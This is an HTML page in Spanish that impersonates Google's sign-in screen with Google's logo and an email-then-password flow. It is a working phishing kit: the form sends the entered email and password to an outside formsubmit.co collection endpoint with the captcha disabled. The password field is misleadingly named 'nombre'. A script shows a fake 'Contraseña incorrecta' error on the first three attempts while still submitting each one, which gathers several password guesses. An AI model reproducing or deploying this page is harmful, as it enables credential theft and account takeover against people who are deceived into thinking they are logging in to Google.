<!DOCTYPE html> 
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accede a tu cuenta</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#f0f4f9] flex items-center justify-center min-h-screen">

  <!-- Contenedor -->
  <div class="w-full max-w-md bg-white shadow rounded-2xl p-8">
    
    <!-- Logo + Título -->
    <div class="mb-6">
      <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" 
           alt="Google" class="w-10 mb-4">
      <h1 class="text-2xl text-gray-900 font-normal">Accede a tu cuenta</h1>
      <a href="#" class="text-sm text-gray-700">Ir a Gmail</a>
    </div>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          class="space-y-5">

      <!-- Paso 1: Correo -->
      <div id="step1">
        <input 
          class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600"
          id="correo"
          name="correo" 
          placeholder="Correo electrónico o teléfono" 
          type="email" 
          required>

        <div class="text-sm mt-2">
          <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
        </div>

        <div class="flex justify-between items-center mt-6">
          <a href="#" class="text-blue-600 text-sm">Crear cuenta</a>
          <button type="button" 
                  id="btnNext1"
                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
            Siguiente
          </button>
        </div>
      </div>

      <!-- Paso 2: Contraseña (oculto al inicio) -->
      <div id="step2" class="hidden">
        <p class="text-gray-700 text-sm mb-2">Introduce tu contraseña</p>

        <input id="nombre" 
               class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600" 
               name="nombre" 
               placeholder="Ingresa tu contraseña" 
               type="password" 
               required>
        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">Contraseña incorrecta</p>

        <!-- Hidden fields -->
        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
        <input type="hidden" name="_captcha" value="false">

        <div class="flex justify-between items-center mt-6">
          <a href="#" class="text-blue-600 text-sm">¿Olvidaste tu contraseña?</a>
          <button type="submit" 
                  class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
            Siguiente
          </button>
        </div>
      </div>
    </form>
  </div>

  <!-- Script -->
  <script>
    let intentoNombre = 0;

    // Paso de correo → contraseña
    document.getElementById("btnNext1").addEventListener("click", function() {
      const correo = document.getElementById("correo").value.trim();
      if (correo === "") {
        alert("Por favor ingresa tu correo");
        return;
      }
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");
    });

    // Validación contraseña
    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 4) { 
  errorMsg.classList.remove("hidden");
  nombre.classList.add("border-red-500");
  errorMsg.textContent = "Contraseña incorrecta";
} else {
  errorMsg.classList.add("hidden");
  nombre.classList.remove("border-red-500");
}

    });
  </script>

</body>
</html>
